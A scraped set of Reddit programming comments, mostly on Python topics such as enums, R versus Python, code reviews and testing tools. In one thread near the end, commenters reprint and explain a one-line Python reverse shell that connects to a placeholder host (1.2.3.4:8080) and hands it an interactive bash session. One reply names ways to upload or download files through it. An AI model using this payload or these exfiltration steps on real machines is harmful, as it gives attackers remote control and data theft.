I've had that in mind since I listened to some talk on pycon about version numbers. V 1.1 would be the same as 1.10 if you store the version numbers as floats ^^
Enums are not endemic to Python, and if you look at their implementation... they are far more complex than you would want them to be, in other words, too slow and too memory thirsty to be useful for parsing. Another problem with enumerations is that Python doesn't have any language construct to support working with enumerations. The languages which "naturally" have enumerations have matching mechanism which has certain desirable properties like "ensure that all cases are handled" or "ensure there aren't stray numerical values" etc. There's nothing like that in Python. You can kind of build it on top of existing `Enum` class, but it still will be too lopsided to be practical.

Very nice! I'm also working at an accounting firm with my IT knowledge. I'm currently working on a charge sheet program to bill clients (export the invoices to Pastel) and all I can say is that IT people are going to be the future of accounting. You should consider using sqlite to add everything to a database. It'll be a difficult step at first, but I'm sure you'll manage. Are you going to share your code? If so, github is a great place to share it and contribute to the community. 
Step 1: Find out whether you will be working in python 2 or python 3, if you can choose, pick python 3. Step 2: Go here: [code academy](https://www.codecademy.com/), complete the relevant python course. Step 3: Find some reasonably easy problems to solve. [daily programmer](https://www.reddit.com/r/dailyprogrammer/) is okay. Step 4: Once you've done a few of these you should be comfortable enough in the language that you can start trying to apply it to something relevant. 
Thank you, also may I ask what's the difference between python 2 and 3. And if 3 the supposedly the newer one y do people still use 2?

Julia just got v1, so I wouldn’t expect huge adoption yet but it’s finding quite a niche in Economics and HPC. I use it for almost all the optimization problems I come across because JuMP has the best interface around and it feels easier than numpy and scipy for that. I don’t think Julia will take over python, and I’m sceptical it will be the number one I’m data work, but it’s a fantastic tool that I think will take over matlab and quite possibly most of math outside of what Wolfram and R do. 
Probably not the best way, but you can use machine learning algorithms to generate a decision tree from a table of decisions. (Conditions--&gt;Action pairs) https://en.wikipedia.org/wiki/Decision_tree_learning Most examples of the decision tree learning will feature predictive nature, (Will this loan go bad? Did this passenger survive sinking of the Titanic?) but you can make it *predict* and mimic *your* behavior in a certain condition. The best aspect of this approach is that you can update the tree by adding one line to the table and letting the computer do the rest. Just watch the bot play, and tell it "you should've done this instead of that." And repeat.

What would you be using Django for, exactly? 
I can see two reasons: 1. there's a rust library you want/need to interop with. Easier to just interface with rust than write a custom C binding to it and then to Python and deal with an the issues and bugs that arise from that. 2. This is personal, but I feel much more comfortable writing Rust than C.

&gt; Python would be a lot slower if it was actually interpreted as is line by line But Python really does interpret line by line.

'there's less fiddling with incidental things,' is this true? I've done some minor projects using MATLAB and I found it was much easier to get started with it compared to Python. I'm going to stick to it and keeping practicing, but I'm finding getting off the floor with Python is a bit more unintuitive and more difficult than MATLAB. It feels like a more advanced language to me, with my limited experience.
As far as I understand the need Given specific parameters X, the bot must do the actions y. So it is about training a classifier with X and y. So that given a situation s, the trained classifier will return the action a to be done by the bot. Is that it OP ?
Interesting interpretation!
Ah okay that looks more suitable 
Creating a movie app that finds upcoming movies (either being released at the cinema or on dvd/blu-ray), then displays them to the user based on the users ratings of previous movies. I’m finding the selenium web scraping stuff fine, but I’ve never used SQL with python so I’m spending ages writing one line at a time then going back to several webpages and YouTube vids to make sure I’m still doing it right! :)
I'm working on a discord bot that is meant to be up 24/7 for a server and maybe be launched for anyone to use. It's using asyncpg to store points and stuff.
What is the advantage of this github vs the standard decision trees classifier ( DecisionTreeClassifier ) from sklearn ?
&gt; I assumed that since Python doesn't naturally supports abstract classes the idea of a Gender class would be unpythonic. You might like to check out [Abstract Base Classes for Containers](https://docs.python.org/3/library/collections.abc.html).
I think the error is not in the part of script you shared. 1. What is the value of abquant? 2. Where is the intxt packed and with what configuration parameters? 3. What is janela? 4. What is abas and what abas.add does? The answers to those questions can't be obtained just by looking in the script you posted. And without those answers it is not possible to deduce where is the error. Vitalije
actually, `-=` should work here, did you try it? good call on `-=`
Can anyone explain why there are camel bums for Javascript, C++ and java curve? How can we even trust this graph? It has no source nor data collection method linked.
Thanks for sharing :)

I had both mypy and pylint installed before installing the two pycharm plugins, and it didnt work, after uninstalling mypy and pylint, and now reinstalling them. It now works great. Sorry for the trouble
ayeeeee +1 python lol
And Python does not show the same behaviour since people in academia never take vacations ;)
It should fill your needs [https://github.com/manatlan/wuy](https://github.com/manatlan/wuy)
Because Rust is hip and cool and not nearly as marketable as C or C++. Don't you understand the value? Gosh!
Is there a pandas modulo method? Or if not can you use numpy's? (I do very, very little pandas work). I ask because df2 = df.apply(lambda x: (x.word, x.counts-100000000 if x.counts&gt;=100000000 else x.counts), axis=1, broadcast=True) Can be simplified assuming the max count is 99999999-- the if condition is unnecessary, just `x.counts % 100000000`, and of course using a function from numpy (and perhaps pandas) could be done at the C layer and would be significantly faster than this.
Why would that be a non-starter? That makes no sense. Even if you install dependencies for them, using cargo to do it is easier than you writing a script to do it for them. If you insist on doing it manually, then you can do that if you really want to. Cargo existing doesn't mean you have to use it, even though you should.
Haha I actually just thought about it and I'm not totally sure it would work. The global logging variable would need to be set before the function definition. This means that if you wanted to a command line way to enable logging you would need to have your main before all the definitions. 
What does this have to do with python?
Today I have started to build a web application to learn English language. In that app I am using Django and Vue.js. 
Yes, I plan on making a request this week. Cartopy uses Project4 for the math calculations, which is done in C, so I can’t do it myself (no C workflow). But it would definitely be better to have this in Cartopy. Unfortunately it may take several months to happen, judging by the last projection request.
Few comments in no-order of priority 1. Avoid committing buffer files {this are the files that end with "\~" Tilda} 2. Learning Markdown for documentation will help you in long term -- since I've been using Markdown I don't remember spending even 30 secs worrying about formatting issues 3. Learn to write better \[README\]([https://medium.com/@meakaakka/a-beginners-guide-to-writing-a-kickass-readme-7ac01da88ab3](https://medium.com/@meakaakka/a-beginners-guide-to-writing-a-kickass-readme-7ac01da88ab3)). Not only they serve as a good design documentation it help communicate you idea. Starting off with elevator pitch definitely helps 4. Learn proper use of \[requirements.txt\]([https://devcenter.heroku.com/articles/python-pip](https://devcenter.heroku.com/articles/python-pip)) - I didn't see any dependencies, but throwing it out there just in case 5. On looking at \[wikichomp\_py3.py\]([https://github.com/deifius/inasra/blob/master/wikichomp\_py3.py](https://github.com/deifius/inasra/blob/master/wikichomp_py3.py)) you could have broken down function of \`acronymizer\` into more readable chunks. 6. Don't forget to add \[Docstring\]([https://www.geeksforgeeks.org/python-docstrings/](https://www.geeksforgeeks.org/python-docstrings/)) to your functions that will help you in future 7. Avoid imports you're not using E.g. \`subprocess\` is imported but not used Hope this helps!

**Note:** PyXLL only works with the Windows version of Excel. It does not work with Excel for MacOS. Also, if you wish to share a PyXLL-enhanced spreadsheet with someone else, they will need to [install PyXLL themselves](https://www.pyxll.com/docs/quickstart.html) *and* you will need to give them a list of the python functions they they need to manually edit into their pyxll.cfg file. I.e., this is not a portable solution. If you are using Excel for yourself and you are never going to share the actual spreadsheet and you are (poor thing*) on Windows, PyXLL looks quite powerful as a GUI designer. * I kid, I kid. Mostly.
Some thoughts on a quick look 1. Use \`requirements.txt\` to capture and document your dependencies {E.g. BS4, Requests etc} 2. Add docstring to functions, it gives you an idea at high level what a given function does 3. In \`vidlinks.py\` script you've used \`i\` counter but haven't used anywhere, so why use it? 4. Use meaningful names E.g. \`if r in vid\_links:\` could be refactored as \`if current\_link in vid\_links:\` 5. Have your constants in \`config.py\` and use it from there {E.g. DEVELOPER\_KEY etc..} 6. This can be refactored \`if 'channelId' in response\['items'\]\[0\]\['snippet'\].keys()\` to \`if 'channelId' in response\['items'\]\[0\]\['snippet'\]\` and it should still work
Given that we have data about features {E.g. Context Around the Player} and a Target Variable {E.g. Actions to take} we can induce a Decision Tree and ask it to generate Target action based on current state of Game. Although using a reinforcement algorithm would be better given that you will need to have Path Planning etc.
Getting back in the saddle with my toy language compiler project: [https://github.com/syegulalp/Akilang](https://github.com/syegulalp/Akilang) Right now I'm working on rewriting how the built-in `print` statement works, and figuring out some more memory tracing rules for things like automatic freeing of malloc'd objects when they go out of scope. I've also uploaded a little demo movie: [https://www.youtube.com/watch?v=9vZ4oFCFOl8](https://www.youtube.com/watch?v=9vZ4oFCFOl8)
Interesting that Python growth seems to have been slower in lower-income nations. Fewer data science jobs?
No, there’re very different.
Thank you il check that out! I’ve allowed the user to specify what attributes are important when choosing a movie, cast/director/genre/writer etc, so say someone only cares about the actors, they’d have their algorithm be 90% weighted on cast, and 10% on genre, then those weighting’s are applied to the scoring for any upcoming movies 
Cool that is a good way to start, I would suggest also look at [Recommender Systems in Python 101](https://www.kaggle.com/gspmoreira/recommender-systems-in-python-101) might give you few good ideas.
Wow thank you! Plenty to do now. 
Also - Java is statically typed. Static vs dynamic typing has major impact on performance.
Maybe because poor people tend to make decisions that make them less success financial. Programming language choice is one of such things. But overall world income still grows. 
I aam deeply disappointed that no language on an upswing trajectory has zero-cost abstractions, move semantics, guaranteed memory safety, threads without data races, trait-based generics, pattern matching, type inference, minimal runtime and efficient C bindings
&gt;since I've been using Markdown I don't remember spending even 30 secs worrying about formatting issues I'm guessing you are trying out the new fancy reddit editor (or a new mobile app), because ironically all your Markdown formatting didn't work in your post. It's all escaped so [links](https://www.reddit.com) don't like appear as links but appear like \[links\]\(https://www.reddit.com) and \`subprocess\`.
I would create a Finite State Machine in NetworkX. 
Thank you for pointing out, let me rectify it. It was stupid of me to assume that it will work out of the box

The link works for me &gt; Suppose we have a pattern of N bits set to 1 in an integer and we want the next permutation of N 1 bits in a lexicographical sense. For example, if N is 3 and the bit pattern is 00010011, the next patterns would be 00010101, 00010110, 00011001,00011010, 00011100, 00100011, and so forth. The following is a fast way to compute the next permutation. unsigned int v; // current permutation of bits unsigned int w; // next permutation of bits unsigned int t = v | (v - 1); // t gets v's least significant 0 bits set to 1 // Next set to 1 the most significant bit to change, // set to 0 the least significant ones, and add the necessary 1 bits. w = (t + 1) | (((~t &amp; -~t) - 1) &gt;&gt; (__builtin_ctz(v) + 1)); The __builtin_ctz(v) GNU C compiler intrinsic for x86 CPUs returns the number of trailing zeros. If you are using Microsoft compilers for x86, the intrinsic is _BitScanForward. These both emit a bsf instruction, but equivalents may be available for other architectures. If not, then consider using one of the methods for counting the consecutive zero bits mentioned earlier. Here is another version that tends to be slower because of its division operator, but it does not require counting the trailing zeros. unsigned int t = (v | (v - 1)) + 1; w = t | ((((t &amp; -t) / (v &amp; -v)) &gt;&gt; 1) - 1); https://graphics.stanford.edu/~seander/bithacks.html 
I took a look at the code (since this is only a few hundred lines) and I think you need to be **way** more upfront about how this works. You aren't doing anything *wrong* per-se but there is a ton (!!!) of nuance in how you are "solving" the minimum without talking about it. You're doing an RBF surrogate-based optimization which has its own large set of gotchas. And, you are doing some normalizing like `np.math.factorial(d/2)`. What if I have `d = 30`? That is not unreasonable! And RBFs can easily fail or give you nonsense results. Again, your code is valid, but you are generalizing a gigantic area of (active) research into a single tool that may not be the right one. For anyone who is faced with this, I would say to proceed with extreme caution. (Source: PhD + experience in Uncertainty Quantification that deeply integrates all of the areas addressed here)
np.math.factorial(d/2) is only called when d is even number (see full if-then-else statement) so it is correct. In case some things in the code are not obvious, they are described in detail here (this note is alse mentioned in README): https://arxiv.org/pdf/1605.00998.pdf I don't think there is "right" or "wrong" way of doing optimization. This is a method I built to solve my own problems and it always worked successfully. The real question is how much faster/slower it is in comparison with other methods. For that I would need to add benchmarks. I'm planning to do that soon. Thanks for your feedback!
tldr you want Rust to be more popular?

Whole bunch of people trying to learn.
I'm just disappointed that there are no trait-based genetics in any of the languages I know and love today.
Worry less about the syntax and more about writing idiomatic, expressive (read expressions over statements where reasonable), high-level Python code. Stop thinking Java boilerplate, and think about whether you really need to write that class or internal framework in Python.
Cannot do with just \`print()\` and \`input()\` unless you hardcode terminal escape sequences into your \`print()\`, which I really wouldn't recommend. &amp;#x200B; That's just not how a terminal works.
\- What OS? Elephant in the room, but Linux will give you the best performance and control. Windows won't… or if it did, you wouldn't really know why since it's not transparent like Linux. \- MacBook pro's overpriced, at not really the kind of quality you need. \- Thinkpad X1 carbon's not a performance machine. Get a T-series or P-series. \- Besides, pandas is the limiting factor for a good deal of the performance. It's not the most efficient data-loader, zero-copy, or able to do out-of-core dataset processing. \- More cores past a point won't help at a reasonable price all unless your code really is embarassingly parallel. \- CPU bandwidth matters nought unless the I/O and memory can keep up. Have you profiled your code? \- Get ECC memory if you can. Intel would probably require a Xeon.

- The server, which server. Provide context or use the indeterminate determiner. - They told you to rethink your design, but did you really ask for all the constraints? - Don't conflate storage formats (e.g., JSON, etc.) with messaging (which you don't have between clients), or with hybrid computation/storage systems (i.e., proper shared databases accessed via a network protocol). - Think about the concurrency and prove to us that you did before you talk about \`cron\`, \`json\`, etc. And yes, everything blows here because you can't even use an imperformant solution called locking the file. - Drop bloody FTP. Insecure, overcomplicated, underspecified garbage.
- And while at it, are you solving the right problem? Are there existing protocols, frameworks, execution environments, etc. to do calendaring?
Yea no. I once spent several hours chasing down a bug in someone's C extension...because they were casting a signed int to unsigned. Never again.
oh,Now i remembered it , i took it in high school but i thought it was something else.

&gt;non-high-income what's wrong with calling them low-income?
take it easy guys, its just me, started out in 2014
In my experience, it's due to companies refusing to hire a Dev team to migrate to newer technologies, only wanting minimal developers to maintain their legacy shit, that's why PHP is so much popular.
Because that doesn't include middle income?

Don't get me started on Nim. For me personally as an ex-Delphi user, the short answer is because the creator borrows several of the poor ideas from Pascal along with the good ones for no reason other than nostalgia. 
You should get into firebase.google.com then create a test project and give it a look. It looks identical with mysql is creating arrays and objects you should give it a look yourself the interface is very simple. What i can say is that it works fast and is protected by google

Data is the new labor. Redhat is following the Microsoft model where they claim ownership of all user data "for the greater good". These companies in turn follow rulers like Stalin and Mao where Communism is hijacked for the benefit of the rulers.
R is designed to be easier than python. I don't know why you said that python has a far easier learning curve. It's not at all. I don't think this is an opinion. If you are not building a real-time system, R is a *better* for social science study. Numpy and Panda are already something social scientists probably don't want to think of. Numpy basically gives you matrix computation which is built-in in R, and Panda is essentially mimicking R's dataframe. You can install R and Rstudio with the time to download and time that installers takes to install program whereas setting up python, anaconda (spyder), jupyter notebook and use pip or conda install to install matlibplot and numpy and panda is absolutely not beginner friendly at all. But Python is likely (not much?) faster but notebook is pretty slow as far as I feel. You haven't given me any compelling reason why Python is better for social science study at all. The advantage I can think of is that you can do more things with python other than statistical modeling like web app development as it is a general programming language. 
On mobile, can't help with most. But you might want to check out [`os.walk`](https://docs.python.org/2/library/os.html#os.walk) if you haven't already and are still in-need. Also, r/learnpython for these sort of questions.
So I'm guessing the pythonic way of using Enums is to not use them at all, unless absolutely necessary? How bad is the performance drop compared to using basic class variables or Abstract Based Classes?
Python is a superb language. Idiomatic, easy to learn, but capable of building big projects, no matter what type, be it games, scientific, machine learning, websites or others. Together with its large community and high number of awesome libraries it is my first choice for an interpreted dynamically typed programming language.
I seriously question the methodology when Elixir appears below Awk, Logo, Tcl, and Scheme. I don't use Elixir, but I see a lot of buzz about it, and have trouble believing that the community and interest is smaller than those languages (this is not a criticism of those languages).
Building a Docker container that runs a Python service to aggregate stats for a client's enterprise GIS environment and writes them to a cloud db. Writing an AWS lambda task that starts up cloud servers for a failover environment when it decides that said GIS environment is "down."
Store the pronouns in each person object, but perhaps initialise them from the enum. This is the sort of domain logic that might have to be changed, a lot, at some future time. Germany officially recognises three genders, or you might encounter a child born with some abnormality, or someone might just have an operation. Whatever the case, it's the sort of thing you might need to edit for an individual so store it with their data.
Who hurt you?
Why python? If you are going to work with microcontrollers(which most machines have/use) you should learn c/c++.

Yeah, I think it's slow. But people use C/C++ routine every once in a while for that part. Graphics is better for R than using matplotlib, maaaaybe. What part is weird?
Java
How dare you talk about R on the Python sub! GET HIM! &amp;#x200B; ssssssssssssss! 
First, simplify a bit by removing the bits we aren't using, so I can see the relevant code: a = [1, 2, 3, 4, 5, 6, 7, 8, 9] def num_gen(): num_list = [] for c in a: for j in a: if c == j: continue num1 = c*10+j num_list.append(num1) return num_list Maybe give some better variable names: digits = [1, 2, 3, 4, 5, 6, 7, 8, 9] def num_gen(): num_list = [] for digit_a in digits: for digit_b in digits: if digit_a == digit_b: continue num1 = digit_a * 10 + digit_b num_list.append(num1) return num_list Okay, so "continue" is a useful thing, but it can confuse things, so we only want to use it when it's really useful. So let's turn that inside out, slightly, and get rid of it. digits = [1, 2, 3, 4, 5, 6, 7, 8, 9] def num_gen(): num_list = [] for digit_a in digits: for digit_b in digits: if digit_a != digit_b: num1 = digit_a * 10 + digit_b num_list.append(num1) return num_list At this point, it looks a lot more pythonic to me, and I can understand what it's doing. But as a bonus step, I'm going to translate it into a list comprehension: digits = [1, 2, 3, 4, 5, 6, 7, 8, 9] def num_gen(): return [a*10+b for a in digits for b in digits if a != b] [List Comprehensions Tutorial](https://www.pythonforbeginners.com/basics/list-comprehensions-in-python) covers the basic steps of transformation.
To rephrase the more verbose comment I made: 1. Name things so that you can tell just be reading the variable name or function name, "what is this?" 2. Simplify whenever possible. In this case, reversing the "if" to eliminate the "continue" was helpful. 3. Another simplification: Don't leave lots of commented-out code hanging around. That's why you're using git, so you can get them back if you need to. 4. Python has a lot of syntactic sugar, like list comprehensions. You don't have to use them, but the results are often more beautiful.
Is it easy to trick Mac users into running the malicious script? &gt; Social Engineering Attacks &gt; The real challenge is the social engineering aspect of an attack. How does a hacker trick someone into running malicious code? Well, I had some fun this weekend and composed a simple scenario in the form of a short story which may help illustrate a practical use for hacking macOS using a single command.
Yeah I did, whoops!

I'm not looking to hack into someone's laptop lol I'm just curious as to how it works
while C# seems to have an inverse relationship with Java. Makes sense though. Hopefully .net Core turns it around a bit - seems to have found its bottom in high income countries.

I don't have the ability to actually test out this code right now, but from reading over it, I believe I have at least a general idea what it does. The first command creates a socket (like a multipurpose bidirectional internet stream, more or less) named `s`. The second command actually creates a connection with that socket. I'm assuming `1.2.3.4` is a placeholder here, which would be replaced with the address of the attacker's server. `8080` is just an arbitrary port choice that is likely to make it through most firewalls (its normally used for low-privilege HTTP connections, ie. you don't need superuser permissions to run a process that listens on it like you do for the typical port 80). The next three commands all work off of file descriptors/numbers (I forget the semantic difference here; I use these terms interchangeably). `s.fileno()` gets the descriptor for the socket that was opened (an arbitrary number chosen by the OS). 0, 1, and 2 are special reserved file descriptors that refer to STDOUT, STDERR, and STDIN (not in that order). The `os.dup2` calls do basically what they sound like they do: duplicate a file descriptor so that file handles which refenece those descriptors will also read to/write from the second descriptor. Finally, the script starts a terminal session. The end result here is that, since STDOUT/IN/ERR are hooked up to the socket, the remote attacker basically has a remote terminal session that they can access over that socket. So the attacker would keep port 8080 open on their machine (at 1.2.3.4) listening for an incoming socket request, then do some piping on their side to be able to issue requests to the socket and read the results from it. Again, this is only a vague idea, and there are a few pieces I'm missing here (namely the purposes of the options passed to `socket.socket`, and the exact function of `os.dup2`.
So basically this allows the hacker to run terminal commands remotely? Does this let the hacker download files or something from the hacked computer? Thanks for your response
Mmm, it seems that the plugin cannot find mypy. Is it [installed](https://mypy.readthedocs.io/en/latest/getting_started.html)? Can you try to specify the absolute path to it inside the plugin settings?

Try to change fill=X to fill='both' in ``` abas.pack(side='top', fill=X, expand=True) ``` 
&gt; &gt; Pandas is the limiting factor &gt; Can you articulate a little more? NVM. Just realized that you articulated it in your own reply to another comment in this post. I wouldn't call dask the lowest overhead parallelization though, given that it's a more generalized than same-machine multiprocessing framework. &gt; &gt; ECC &gt; Why? Reliability. If you went Xeon or Threadripper and their exclusive controllers, and your dataset size, might as well not play the odds. I'd have to find the error rate numbers.
You make a lot of great points that I agree with. But remember that you're dealing with social scientists here, not programmers. The average social scientist does not have a sound understanding of programming logic and will not be able to easily pick up R right out of the box. Just because someone has a background in research design and even mastered SPSS doesn't mean they will be able to utilize R in the same way. [R *is* difficult to learn](http://r4stats.com/articles/why-r-is-hard-to-learn/), especially if all you've used is a GUI interface for analysis. Its documentation is not written for beginners, its function naming and syntax is inconsistent, and it takes a lot of setup to get going. It makes much more sense to me to learn a general multi-purpose language first, work with that for a 6 months to a year, and then transition to R if you really have the need for it. And in the long run, if someone is serious about data science, they should know both of these languages - they are two extremely powerful tools that give you nearly limitless options when you use them together.

read the sidebar. try google.
Do you really think so? Isn't R far easier to learn? I dont know where that comes from. For example do business school should teach python for their data analytics course??? You make little sense to me.
A panda buddy script. 
Because Python is open source, multi platform, I would expect it's growth to be more or less the same in low and high income countries. Contrary to C#
The scaling of the y-axis and the grids are really horrible.
I've putted the expand attribute I'm glad for your help!I finaly solved the problem ^^
I disagree, Rust is still a nightmare at certain points and there is less documentation on those hard, rare issues than there is in C
In a previous job I used a language based on decision tables. You can embed complex logic and actions in a very concise way. The syntax was very similar to this: [this](https://i.imgur.com/FrAwMWN.png) Now imagine those conditions weren't independent, so you could have lots of columns with multiple ```Y```s (or ```N```s in each) as well as multiple, potentially unrelated actions triggered rather than just the one in per column like that image. More info: https://en.m.wikipedia.org/wiki/Filetab
Some more comments in no order of priority (with nitpicks mixed in with bigger... picks(?) ) 1. Also don't need the `__pycache__` folder 2. Don't need `*.pyc` files in general 3. Looks like you use integers when you should be using booleans (`1` / `0` vs `True` / `False`) 4. Looks like you're mixing whitespace in at least one file (like [here](https://github.com/deifius/inasra/blob/master/bonecandidateflattener.py), on lines 11 and 12 vs 17 and 18) and that's a really pretty bad idea. 5. You appear to be using `is` more frequently than you should-- generally, just checking if something `is None` is pretty much the primary use case of `is`. The empty string isn't guaranteed to be a singleton (see [this](https://stackoverflow.com/a/25273422) SO answer) 6. I'm not sure the `boardtrim` function (in `crystalyzation.py`) needs to be recursive, but if it works... 7. Although `boardtrim` is also defined in `boardtrim.py`, so you should probably pick one and stick with that 8. The way the `cyrstalyzation.py` file is structured is that a lot of it is run on import and that's generally considered bad practice. 9. A couple of your files have `from glob import glob as glob` which can be simplified to `from glob import glob` 10. It's a pretty bad idea to modify something that you're iterating over. I'm not sure what you're trying to do with the bit of code on lines 27 and 28, but it probably isn't doing it. Instead, maybe try `each = [list(b) for b in board]` or something along those lines 1. `crystalyzation.py` appears to be doing a lot in one go. Try splitting it up into different functions that each do a smaller part so that way it's easier to test and debug. It also ends up being somewhat self-documenting! 2. Blind catches (`try: ... except: ...`) are a generally bad idea since they'll catch everything, even `KeyboardInterrupt`s when you're trying to stop the program. They'll also catch more than you mean to and hide genuine errors. Try to catch something specific (`try: ... except KeyError: ...`) or something like that. 3. It's generally a better idea to handle opening and closing files with a [context manager](http://book.pythontips.com/en/latest/context_managers.html) instead of `open` followed by a `close` 4. Towards the end of the file, you're calling `visualize` potentially 3 times, which seems excessive to me. 5. `for i in range(len(someiterable)):` is generally frowned upon as being non-Pythonic, especially if you then access items (`someiterable[i]`).

What models does auto-keras iterate through?
Easiest way to start analysing something like this is to reformat it into the way we normally look at code - ie, *not* compressed onto one line: import socket, subprocess, os s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect(("1.2.3.4", 8080)) os.dup2(s.fileno(), 0) os.dup2(s.fileno(), 1) os.dup2(s.fileno(), 2) p = subprocess.call(["/bin/bash","-i"]) Then you can start picking apart what each bit does. That `os.dup2` call looks interesting, so let's check [the documentation](https://docs.python.org/3.5/library/os.html#os.dup2): &gt; `os.dup2(fd, fd2, inheritable=True)` &gt; Duplicate file descriptor fd to fd2, closing the latter first if necessary. So we're remapping file descriptors 1, 2, and 3 (which under standard *nix conventions are stdin, stdout and stderr) to an open network socket. We then open an interactive terminal session with these mapped. That means whoever is on the other end of that socket has visibility (through stdout and sterr) of everything the terminal puts out, and access via stdin to send it arbitrary commands. This amounts to full remote control of the box up to the access level of whoever ran the command.

we've done something similar, but using docker (as a generic means by which to speedily and portably test anything that's got a container: pg, redis, rabbit, etc). because it tests an api, I prefer to spin up the whole db so it can commit normally, but it does sacrifice some speed. I could imagine providing a unique db from the fixture each time though, so we could use xdist without fear
Could also be the use of each language. The main reason to use higher level languages like python is because some conplex things are just easier to write and maintain with higher level than low level (i.e. C, assembly). But for lower income places, their business mostly rely on grunt work, like making a fast webpage. So for lower income groups, they usually don't need higher level languages because their jobs/tasks don't require that level of sanity protection against complexity, yet. 
If you scroll down to see the updated results, you can see Rust is actually 2x faster than C in this particular benchmark.
Very interesting to note that older languages such as php, even Java and JavaScript are much more popular (more people use it based on questions asked) in lower income countries while Python (mainly for data science) is more popular in high income countries. This somehow intuitively tells that a lot of grunt work is outsourced to lower income countries in technology.
And java script is inversely coupled because that's what the students do when they have free time?

Depending on your needs, check out miniconda instead. It's barebones comparatively.
We use them at work. We have docker containers with machine learning models that integrate with a .net app. We use Vonda heavily since all of our ml models are sklearn, or other statistical libraries. 
I’d take Fortran over either for most computation I would integrate with Python. You don’t have to deal with pointer aliasing, coarrays are incredible, and vectorizing code is trivial. 
Vonda installs MKL for bumpy be default. I spent some time chasing down a mkl version before I had conda. Some sites tried to get you to pay for it? Not sure if that has changed since I swapped to conda though. 
Statisticians have been using R. Python is for machine learning and AI model (neural network and so on) mainly because it is a tool for computer scientists. You would probably find more libraries for your field in R than Python.
conda by default installs the `mkl` package and compiles `numpy` and whatnot against it, so if you wanted mkl there shouldn't be anything else for you to do. If you don't want `mkl` there's `nomkl` (look it up... sometimes dependency resolution gets messy)
AWK and Tcl are still staples in Unix environments. 
&gt; Graphics is better for R than using matplotlib, maaaaybe. I think this is preference. Matplotlib is highly customizable, especially when coupled with seaborn. Let's not forget plotly if you're suggesting R's interactive highcharter.
Noted. Will look into it at some point. 
awk is the language you use for reading tab separated records. The fact that it is Turing complete is a bit of a footnote.
R is pretty entrenched on academia. This is because statisticians took it up as an alternative to SPSS and wrote a bunch of free packages for it that other academics used and promoted. This is how I encountered it, as a biologist. But outside of academia, R is a ghost town. Python is wildly more popular in industry and can do much more than just statistics. If you do parametric modeling, there is scikit.learn, numpy, pandas, and stan. These tools together can do much more than R, and you can pass off your code to developers that can build on it. If I sens an R package to a backend dev, they typically just respond with the middle finger.
Thank you so much for the detailed explanation!
Do Solidity!
not enough info. What's your data source like ? what's your process flow like ? 
oh no. openpyxl and xlwt/xlrt are similar.
There are two tools here, one is for mocking (pgmock) and the other is for spinning up real pg databases inside pytest (pytest-pgsql). In many ways, pytest-pgsql serves the same purpose as pg_virtualenv but in a manner that is easily used from inside pytest. We tend to use them in concert: - pytest-pgsql for functional tests and integration testing - pgmock for mocking out subsections of queries to allow unit testing of other portions of the query The former verifies that your code is working overall and the latter helps you track down _where_ the code is failing
JSON logging makes it easy to ingest. If dynamic mapping is enabled within elasticsearch then you don't necessarily need to maintain a schema for any/all your application logs. Your data's mapping can be inferred instead.
pytest-pgsql allows for tests inside of a rolled back transaction or inside of a fully isolated database. We use both modes so that we can have tests with full isolation that test real behavior and so that we can have faster, less isolated tests. As with everything, we have to balance trade-offs. Each full database spin up takes about 1-3 seconds on our developer machines while dropping and creating a transaction takes tiny fractions of a second. This lets an engineer ask the question: is fully isolating my test worth adding a couple seconds to my test runtime. We also combine this with sharded tests in our CI environment. Our sharding can be semi-random or repeatable and, by usually running in semi-random mode, we can use test-flakiness as a means of identifying test isolation issues, occasionally identifying unintended behavior in the code itself.

uhh...
Whats a "high-income" anyway? Take average earning of the country? GDP per Capita? Then dollar converted at an exchange rate or PPP adjusted? Maybe just say developed vs third-world instead? I don't know...
The problem was I wasn’t getting mkl with the pip version when I was using virtualenv. That’s why I liked the conda version better 
The reason JavaScript is on there consistently is probably not due to its popularity rather due to what a mess it is. That and NodeJS.
uhhhh...
It would indeed save another `df`, so I would definitely go for it ;)
some join us over at /r/sc2ai and our discord!
I am glad I could help :smile:
Haha, yes your perhaps right. People would obviously ask more questions on messy things such as Javascript.
Forgive the ignorance, but what language(s) would match some or all of your desired attributes?
This isn't really hacking the macbook itself, rather it seems to just be a simple trojan / backdoor that creates a port interfacing to a local shell if you can get someone to run it. The code is just creating a socket on port 8080, and then replacing the 0, 1 and 2 file descriptors (corresponding to the standard stdout, stdin and stderr FDs) with this connection, then creates a bash process. Basically, this just means anything sent to that IP address will be passed to the bash process, and anything it outputs will be sent back. Hence, if you connect to this address and port, you can send commands, and they'll be passed to the bash process and run. To be honest, the same is true of pretty much anything - if you can get the user to run your code, you've pretty much already hacked them.
The deserves a award for the title alone. 
What's the reason for the huge jump in C in the past year?
We assign one database per xdist worker in conftest.py, it does the job. 
One word. Outsourcing. Most of the work in low-income countries is outsourced from high-income. And companies are unwilling to move their highly productional, mission critical, buzz words containing project to some "third world shit hole". But that internal admin tool, accounting software, website, well that's fine.
honestly id build up a data set of prematched audio snippets to their recognized audio and response to said audio. I think this is why Siri is so fast, and also why it only works when connected to internet. It queries a db for results, doesn't do any thinking on its own.
wait... what about Perl 
What do you mean "memory errors". Do you mean it runs out of RAM, because we've had issues when using OpenCV with celery it leaks memory like a sieve and we have to keep restarting celery workers after x number of jobs complete to release the RAM. I haven't been able to find a solution, tried everything, manually freeing cv2 images, etc. Not sure if the leak is in opencv or numpy but it's really annoying.
Yes, this is precisely it. Lower income countries are usually “dev shops” i.e. contracting companies. People who hire them are usually looking to save money and don’t want to invest in new tech. 
And C ? My love C where are you up there (in the graph) , I want to see you too the cheats soon 
Because C is da best from low level to high level
Last I checked, speaker discrimination is still an [open research topic](https://scholar.google.com/scholar?hl=en&amp;q=speaker+discrimination). What is your goal here?
I made a virtualenv for Python 3.6 and ran your code, it took less than 2 seconds for me to see what I said. A couple ideas: - is your computer particularly underpowered? - is your microphone possibly picking up extra noise that the library thinks might be speech, so it's waiting for it to finish?
Thanks for your reply. If a hacker were to use this, how would he or she download files remotely, like it says in the article? 
But wait! There's more!
If you order now, we'll throw in the source code. For FREE! How can we afford to give you this incredible offer, you ask?
They've got shell access to the machine - they can basically do anything someone logged in on the machine can do. Ie. if you want to download something to the machine, just run: wget &lt;url&gt; If you want to upload something, use `wget -post-file` to upload it to a website you control, or scp it to your machine, or start a webserver on the machine serving the files, and grab them from it (Eg. `python -m http.server`) or any other method you want. Ie. you'd do it pretty much the same way you'd do in on your own machine from the shell.
Im talking about the built-in graphics (or ggplot2 or lattice) in R.
